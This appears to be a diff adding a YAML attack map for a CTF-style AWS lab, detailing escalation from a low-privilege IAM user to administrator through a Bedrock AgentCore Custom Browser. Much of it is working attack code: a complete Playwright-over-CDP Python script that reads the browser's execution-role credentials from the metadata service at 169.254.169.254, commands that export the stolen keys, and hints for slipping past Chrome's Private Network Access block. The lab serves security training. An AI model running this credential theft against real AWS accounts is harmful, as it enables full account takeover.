@@ -1,0 +1,134 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-007-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has bedrock-agentcore:StartBrowserSession and
+        bedrock-agentcore:ConnectBrowserAutomationStream permissions scoped to all
+        resources. It also holds bedrock-agentcore:ListBrowsers and GetBrowser for
+        reconnaissance. It has no iam:PassRole permission and no ability to create
+        new Custom Browsers.
+
+    - id: victim-browser
+      label: "Victim Custom Browser"
+      type: resource
+      subType: bedrock-agent
+      arn: "arn:aws:bedrock-agentcore:{region}:{account_id}:browser/pl-prod-bedrock-007-to-admin-victim-browser"
+      description: >
+        A pre-existing AgentCore Custom Browser provisioned by the lab's Terraform
+        configuration. At creation time an execution role was explicitly attached,
+        causing AWS to assume that role on the browser's behalf and vend the resulting
+        temporary credentials to the Firecracker MicroVM that backs the browser session
+        via the MicroVM Metadata Service (MMDS) at 169.254.169.254.
+
+        Unlike the bedrock-006 new-passrole variant, the attacker does not need
+        iam:PassRole or any browser-creation permission. The privileged browser already
+        exists; the only requirement is the ability to start a session on it and connect
+        to its CDP stream.
+
+    - id: target-role
+      label: "Target Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-bedrock-007-to-admin-target-role"
+      description: >
+        This IAM role carries AdministratorAccess and trusts bedrock-agentcore.amazonaws.com
+        as a service principal. AWS assumed it when the Custom Browser was provisioned and
+        continues to refresh the temporary credentials inside the MicroVM. By reading those
+        credentials from MMDS via the CDP session, the attacker gains full administrative
+        access to the AWS account — including the ability to read the CTF flag from SSM
+        Parameter Store.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-007-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as a SecureString parameter in SSM Parameter
+        Store. Retrieving it requires administrator-equivalent permissions in this account.
+        Use the temporary credentials exfiltrated from MMDS to call ssm:GetParameter as the
+        admin role.
+
+  edges:
+    - from: starting-principal
+      to: victim-browser
+      label: "bedrock-agentcore:StartBrowserSession + ConnectBrowserAutomationStream"
+      description: >
+        Start a new session on the pre-existing Custom Browser using
+        bedrock-agentcore:StartBrowserSession. The response includes the CDP WebSocket
+        URL directly in streams.automationStream.streamEndpoint.
+        bedrock-agentcore:ConnectBrowserAutomationStream is the IAM permission AWS
+        checks when Playwright authenticates the WebSocket upgrade via SigV4 — it is
+        not a separate API call.
+      commands:
+        - description: "Discover the target browser ID using helpful ListBrowsers permission"
+          command: "aws bedrock-agentcore-control list-browsers --query 'browserSummaries[?contains(name, `bedrock-007`)].{Name:name,Id:browserId,Status:status}' --output table"
+        - description: "Store the browser ID (also available from Terraform output)"
+          command: "BROWSER_ID=$(aws bedrock-agentcore-control list-browsers --query 'browserSummaries[?contains(name, `bedrock-007`)].browserId' --output text)"
+        - description: "Confirm the execution role is attached and the browser is in READY state"
+          command: "aws bedrock-agentcore-control get-browser --browser-id \"$BROWSER_ID\" --query '{Status:status,ExecutionRole:executionRoleArn}'"
+        - description: "Start a browser session — response contains the CDP WebSocket URL directly"
+          command: "SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session --browser-identifier \"$BROWSER_ID\" --output json) && SESSION_ID=$(echo \"$SESSION_RESPONSE\" | jq -r '.sessionId') && CDP_URL=$(echo \"$SESSION_RESPONSE\" | jq -r '.streams.automationStream.streamEndpoint')"
+      hints:
+        - "Start a browser session against the existing Custom Browser using bedrock-agentcore:StartBrowserSession — the response contains the CDP WebSocket URL in streams.automationStream.streamEndpoint. No separate ConnectBrowserAutomationStream API call is needed; that IAM permission is checked on the WebSocket upgrade."
+        - "Connect with Playwright using playwright.chromium.connect_over_cdp() with SigV4 signed headers (botocore.auth.SigV4Auth on the wss:// URL converted to https://). Register a context.route() interceptor on http://169.254.169.254/** to rewrite GET navigations to the token endpoint as PUT with the IMDSv2 TTL header. Use page.goto() instead of page.evaluate(fetch()) — Chrome's Private Network Access policy blocks fetch() to link-local addresses but not navigation requests."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-007 for technique details."
+
+    - from: victim-browser
+      to: target-role
+      label: "page.goto() via CDP reads MMDS credentials"
+      description: >
+        Using the SigV4-authenticated Playwright CDP session, a context.route() hook
+        is registered on http://169.254.169.254/** to intercept the IMDSv2 token
+        navigation and rewrite it from GET to PUT. Subsequent navigations inject
+        the acquired token as a request header. page.goto() is used instead of
+        page.evaluate(fetch()) because Chrome's Private Network Access policy blocks
+        sub-resource fetch() calls to link-local addresses before Playwright's CDP
+        intercept layer can rewrite them; navigation requests are not subject to this
+        restriction. The returned credentials are parsed and exported as
+        AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN.
+      commands:
+        - description: "Write the Python extraction script that uses Playwright over CDP with SigV4"
+          command: "cat > /tmp/extract_bedrock_007_creds.py << 'PYEOF'\nimport sys, json, os\nfrom urllib.parse import urlparse\nfrom botocore.auth import SigV4Auth\nfrom botocore.awsrequest import AWSRequest\nfrom botocore.credentials import Credentials\nfrom playwright.sync_api import sync_playwright\nBROWSER_ID, AWS_REGION, WS_URL = sys.argv[1], sys.argv[2], sys.argv[3]\nMMDS_TOKEN_URL = 'http://169.254.169.254/latest/api/token'\nMMDS_CREDS_URL = 'http://169.254.169.254/latest/meta-data/iam/security-credentials'\ncreds = Credentials(os.environ['AWS_ACCESS_KEY_ID'], os.environ['AWS_SECRET_ACCESS_KEY'], os.environ.get('AWS_SESSION_TOKEN'))\nsigning_url = WS_URL.replace('wss://', 'https://')\nreq = AWSRequest(method='GET', url=signing_url, headers={'host': urlparse(signing_url).hostname})\nSigV4Auth(creds, 'bedrock-agentcore', AWS_REGION).add_auth(req)\nsigned_headers = dict(req.headers)\nstate = {'token': None}\ndef handle_mmds_route(route, request):\n    if request.url == MMDS_TOKEN_URL:\n        route.continue_(method='PUT', headers={**dict(request.headers), 'X-aws-ec2-metadata-token-ttl-seconds': '60'})\n    elif state['token']:\n        route.continue_(headers={**dict(request.headers), 'X-aws-ec2-metadata-token': state['token']})\n    else:\n        route.continue_()\nwith sync_playwright() as p:\n    browser = p.chromium.connect_over_cdp(WS_URL, headers=signed_headers)\n    ctx = browser.new_context()\n    ctx.route('http://169.254.169.254/**', handle_mmds_route)\n    page = ctx.new_page()\n    state['token'] = page.goto(MMDS_TOKEN_URL, wait_until='commit').text().strip()\n    role_name = page.goto(f'{MMDS_CREDS_URL}/', wait_until='commit').text().strip()\n    creds_text = page.goto(f'{MMDS_CREDS_URL}/{role_name}', wait_until='commit').text()\n    browser.close()\nprint(creds_text)\nPYEOF"
+        - description: "Run the extraction script to steal MMDS credentials via CDP"
+          command: "CREDS=$(python3 /tmp/extract_bedrock_007_creds.py \"$BROWSER_ID\" \"$AWS_REGION\" \"$CDP_URL\")"
+        - description: "Export the admin credentials"
+          command: |
+            export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['AccessKeyId'])")
+            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
+            export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['Token'])")
+      hints: []
+
+    - from: target-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        Using the temporary credentials exfiltrated from MMDS, verify admin access
+        and then read the CTF flag from SSM Parameter Store. AdministratorAccess
+        grants ssm:GetParameter on all parameters in the account, including the flag
+        at /pathfinding-labs/flags/bedrock-007-to-admin.
+      commands:
+        - description: "Verify you are operating as the admin role"
+          command: "aws sts get-caller-identity --query 'Arn' --output text"
+        - description: "Confirm admin access with an action the starting user could not perform"
+          command: "aws iam list-users --max-items 3 --output table"
+        - description: "Retrieve the CTF flag"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-007-to-admin --query 'Parameter.Value' --output text"
+      hints:
+        - "You now hold admin-equivalent temporary credentials. The flag is stored in SSM Parameter Store under a well-known prefix shared by all pathfinding-labs scenarios."
+        - "Use ssm:GetParameter with the scenario-specific parameter name to retrieve the flag value."
